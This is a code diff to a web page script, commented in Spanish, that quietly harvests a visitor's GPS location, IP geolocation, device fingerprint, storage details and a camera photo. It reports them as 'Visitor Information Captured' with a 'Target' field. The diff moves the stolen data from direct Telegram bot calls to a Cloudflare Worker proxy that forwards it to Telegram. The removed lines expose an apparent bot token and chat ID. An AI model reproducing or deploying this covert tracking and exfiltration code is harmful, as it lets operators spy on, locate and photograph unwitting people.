@@ -65,14 +65,15 @@
 
 <script>
     // ================= CONFIGURACIÓN =================
-    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';  // ✅ TU WORKER
-    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';                      // ⚠️ REVOCA Y PON TU TOKEN NUEVO
-    const CHAT_ID = '7555997298';
+    // URL del Worker proxy (el mismo que usas en bioinf)
+    const PROXY_URL = 'https://bot-ubi.societykark.workers.dev/';
+    // URL del Worker de ubicación (para obtener IP y geolocalización por IP)
+    const LOCATION_WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
 
     // ---------- 1. Obtener ubicación desde Cloudflare Worker ----------
     async function getLocationFromWorker() {
         try {
-            const res = await fetch(WORKER_URL);
+            const res = await fetch(LOCATION_WORKER_URL);
             if (!res.ok) throw new Error();
             const data = await res.json();
             return {
@@ -184,32 +185,28 @@
         return blob;
     }
 
-    // ---------- 8. Envío a Telegram ----------
-    async function sendMessage(text) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    // ---------- 8. Envío al Worker proxy ----------
+    async function sendToProxy(text, photoBlob) {
+        const formData = new FormData();
+        formData.append('text', text);
+        if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
         try {
-            await fetch(url, {
+            const response = await fetch(PROXY_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                body: formData
             });
-        } catch(e) { console.warn(e); }
-    }
-    async function sendPhoto(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'photo.jpg');
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch(e) { console.warn(e); }
+            return await response.json();
+        } catch(e) {
+            console.error('Error al enviar al proxy:', e);
+        }
     }
 
     // ---------- 9. Proceso principal ----------
     document.getElementById('btn').onclick = async () => {
-        // 1. Pedir ubicación GPS (lo más importante)
+        // 1. Pedir ubicación GPS
         const gps = await getGPS();
 
-        // 2. Obtener ubicaciones por IP (ambas fuentes)
+        // 2. Obtener ubicaciones por IP
         const [workerLoc, ipapiLoc] = await Promise.all([
             getLocationFromWorker(),
             getLocationFromIpapi()
@@ -222,10 +219,10 @@
             getStorageInfo()
         ]);
 
-        // 4. Cámara (opcional)
+        // 4. Cámara
         const foto = await capturePhoto();
 
-        // 5. Construir mensaje
+        // 5. Construir mensaje (igual que antes)
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
@@ -252,8 +249,11 @@
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
         message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
 
-        await sendMessage(message);
-        if (foto) await sendPhoto(foto);
+        // 6. Enviar todo al proxy (que reenviará a Telegram)
+        await sendToProxy(message, foto);
+
+        // Opcional: redirigir a Google o mostrar mensaje de agradecimiento
+        // window.location.href = 'https://www.google.com';
     };
 </script>
 </body>
